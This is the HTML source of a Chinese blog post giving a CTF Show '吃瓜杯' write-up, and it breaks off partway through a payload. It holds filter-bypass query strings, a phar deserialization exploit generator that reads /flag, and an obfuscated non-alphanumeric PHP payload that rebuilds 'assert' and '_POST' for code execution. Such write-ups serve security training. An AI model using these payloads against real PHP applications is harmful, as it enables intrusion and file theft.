@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ctf-show-吃瓜杯 | 忆 执 昔 来 的 旅 途</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="CTF" />
+  
+  
+  
+  
+  <meta name="description" content="CTF Show 吃瓜杯篇。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-Show-吃瓜杯">
+<meta property="og:url" content="https://xizhi-future.github.io/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/index.html">
+<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
+<meta property="og:description" content="CTF Show 吃瓜杯篇。">
+<meta property="og:locale">
+<meta property="og:image" content="https://i.loli.net/2021/08/16/Zvp58TYJkoBsUfO.png">
+<meta property="og:image" content="https://i.loli.net/2021/10/01/p8VCePGW9IHAQd6.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/14/IekhA6SdQWPnt7N.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/14/KmC57VgziIMBRa4.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/14/R9IkSsTqpHV1dtf.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/14/Rn7LtWDXEldPBp3.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/14/KY4lPejVoOUiqbt.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/14/LiNXRJ9SHnwVtEz.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/16/78L6POtr1spjlBE.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/16/M1JngkVhvbPIDOC.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/16/FyR5WpEugQI9ShK.png">
+<meta property="article:published_time" content="2021-10-01T11:19:34.000Z">
+<meta property="article:modified_time" content="2021-10-01T11:20:18.220Z">
+<meta property="article:author" content="xizhi-future">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/08/16/Zvp58TYJkoBsUfO.png">
+  
+    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+    <link rel="stylesheet" href="/css/vdonate.css" >
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/essayists">随笔</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/friendly-links">友情链接</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/about">About</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-CTF-Show-吃瓜杯" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      CTF-Show-吃瓜杯
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2021/10/01/CTF-Show-%E5%90%83%E7%93%9C%E6%9D%AF/" class="article-date">
+	  <time datetime="2021-10-01T11:19:34.000Z" itemprop="datePublished">2021-10-01</time>
+	</a>
+
+      
+    <a class="article-category-link" href="/categories/CTF-Show/">CTF Show</a>
+
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>CTF Show 吃瓜杯篇。</p>
+<span id="more"></span>
+
+<h1 id="CTF-Show-吃瓜杯"><a href="#CTF-Show-吃瓜杯" class="headerlink" title="CTF Show 吃瓜杯"></a>CTF Show 吃瓜杯</h1><h2 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==4476)&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        die(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,0)===4476)&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=%20010574</span><br><span class="line">?num=%0c010574</span><br><span class="line">?num=%0a010574</span><br></pre></td></tr></table></figure>
+
+<h2 id="ATTup"><a href="#ATTup" class="headerlink" title="ATTup"></a>ATTup</h2><p>zip 文件上传 + 文件包含 file_get_contents —&gt; <a target="_blank" rel="noopener" href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar 反序列化</a></p>
+<p>文件内容过滤  &lt;?   php ，过滤 <code>&lt;?</code> ，无法正常解析为 php 代码</p>
+<p>上传成功发现：序列化与反序列化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class View &#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span> = <span class="string">&quot;:)&quot;</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$stat</span> = @<span class="built_in">stat</span>(<span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发 echo 对象; $text=$test+$对象； </span></span><br><span class="line">__invoke() <span class="comment">//当尝试以调用函数的方式调用一个对象时，该方法会被自动调用</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>生成 .phar 文件：</strong></p>
+<p>我们的目的是成功创建 View 对象然后成功调用 __invoke() 方法，利用 file_get_contents 来读取到文件中的内容。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class View&#123;</span><br><span class="line">    public <span class="variable">$fn</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__invoke</span></span>()&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$this</span>-&gt;fn));</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;&quot;</span>.<span class="variable">$text</span>.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fun&#123;</span><br><span class="line">    public <span class="variable">$fun</span>=<span class="string">&#x27;:)&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        <span class="variable">$fuc</span> = <span class="variable">$this</span>-&gt;fun;</span><br><span class="line">        <span class="variable">$fuc</span>();</span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Be a happy string~&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Just a fun &quot;</span>.<span class="variable">$this</span>-&gt;fun.<span class="string">&quot;&#x27;);self.location=document.referrer;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&#x27;123.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&amp;lt;?= __HALT_COMPILER(); ?&amp;gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun= new Fun();</span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun=new View(); <span class="comment"># 当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</span></span><br><span class="line"><span class="variable">$b</span>-&gt;fun-&gt;fun-&gt;fn=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&lt;?</code> 过滤，使用 实体html 编码代替 ，<code>&amp;lt;    &amp;gt;</code>   </li>
+</ul>
+<p>访问，生成 123.phar</p>
+<p>更改后缀得到 123.zip</p>
+<p>上传</p>
+<p>查询 123.zip</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar://123.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/16/Zvp58TYJkoBsUfO.png" alt="image-20210816154246098"></p>
+<p><img src="https://i.loli.net/2021/10/01/p8VCePGW9IHAQd6.png" alt="image-20210816113908803"></p>
+<h2 id="魔女"><a href="#魔女" class="headerlink" title="魔女"></a>魔女</h2><p><img src="https://i.loli.net/2021/08/14/IekhA6SdQWPnt7N.png" alt="image-20210814201633444"></p>
+<p>注册</p>
+<p><img src="https://i.loli.net/2021/08/14/KmC57VgziIMBRa4.png" alt="image-20210814201610476"></p>
+<p>注册成功，登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">layui.use([<span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;table&#x27;</span>,<span class="string">&#x27;element&#x27;</span>], <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">	  var layer = layui.layer</span><br><span class="line">	  ,form = layui.form</span><br><span class="line">	  ,table = layui.table</span><br><span class="line">	  ,element = layui.element</span><br><span class="line"></span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">home</span></span>()&#123;</span><br><span class="line">    $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;main&#x27;</span>);</span><br><span class="line">    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    location.replace(location.href);</span><br><span class="line">  &#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">logout</span></span>()&#123;</span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;logout&#x27;</span>);</span><br><span class="line">		$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">		location.replace(location.href);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">saveAvatar</span></span>()&#123;</span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;download&#x27;</span>);</span><br><span class="line">	    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;avatar.jpg|true&#x27;</span>);</span><br><span class="line">	    window.open(location.href);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">avatar</span></span>()&#123;</span><br><span class="line">		layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;http://xxx.com/x.jpg(其他格式无效)&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改头像&#x27;</span>,</span><br><span class="line">		&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">      layer.close(index);</span><br><span class="line">		  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;xixi|&#x27;</span>+value);</span><br><span class="line">		  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changeavatar&#x27;</span>);</span><br><span class="line">      location.replace(location.href);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">profile</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">		$.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;page&#x27;</span>);</span><br><span class="line">	    $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">	    location.replace(location.href);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">function</span> <span class="function"><span class="title">changePSW</span></span>()&#123;</span><br><span class="line">		layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;请输入当前密码&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">		&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">		  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="string">&#x27;0x36d|&#x27;</span>+value);</span><br><span class="line">		  layer.close(index);</span><br><span class="line">		  layer.prompt(&#123;</span><br><span class="line">		  formType: 0,</span><br><span class="line">		  value: <span class="string">&#x27;请输入新密码&#x27;</span>,</span><br><span class="line">		  title: <span class="string">&#x27;修改密码&#x27;</span>,</span><br><span class="line">			&#125;, <span class="keyword">function</span>(value, index, elem)&#123;</span><br><span class="line">			  layer.close(index);</span><br><span class="line">			  $.cookie(<span class="string">&#x27;ctfshow&#x27;</span>,$.cookie(<span class="string">&#x27;ctfshow&#x27;</span>)+<span class="string">&#x27;|&#x27;</span>+value);</span><br><span class="line">			  $.cookie(<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;changepwd&#x27;</span>);</span><br><span class="line">			  location.replace(location.href);</span><br><span class="line">			&#125;);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="shellme-Revenge"><a href="#shellme-Revenge" class="headerlink" title="shellme_Revenge"></a>shellme_Revenge</h2><p><img src="https://i.loli.net/2021/08/14/R9IkSsTqpHV1dtf.png" alt="image-20210814203429707"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?looklook=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);<span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;looklook&#x27;</span>])&#123;    highlight_file(__FILE__);&#125;<span class="keyword">else</span>&#123;    setcookie(<span class="string">&quot;hint&quot;</span>, <span class="string">&quot;?looklook&quot;</span>, time()+3600);&#125;<span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];    <span class="keyword">if</span> (is_string(<span class="variable">$ctfshow</span>) || strlen(<span class="variable">$ctfshow</span>) &lt;= 107) &#123;        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[!@#%^&amp;*:&#x27;\&quot;|`a-zA-BD-Z~\\\\]|[4-9]/&quot;</span>,<span class="variable">$ctfshow</span>))&#123;            <span class="built_in">eval</span>(<span class="variable">$ctfshow</span>);        &#125;<span class="keyword">else</span>&#123;            <span class="built_in">echo</span>(<span class="string">&quot;fucccc hacker!!&quot;</span>);        &#125;    &#125;&#125; <span class="keyword">else</span> &#123;    phpinfo();&#125;?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>assert()</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="variable">$_</span>&quot;</span>; // <span class="variable">$_</span>=<span class="string">&#x27;Array&#x27;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; // <span class="variable">$_</span>=<span class="variable">$_</span>[0];<span class="variable">$___</span>=<span class="variable">$_</span>; // A<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$___</span>.=<span class="variable">$__</span>; // S<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // E <span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // R<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // T<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // P<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // O<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; // S<span class="variable">$____</span>.=<span 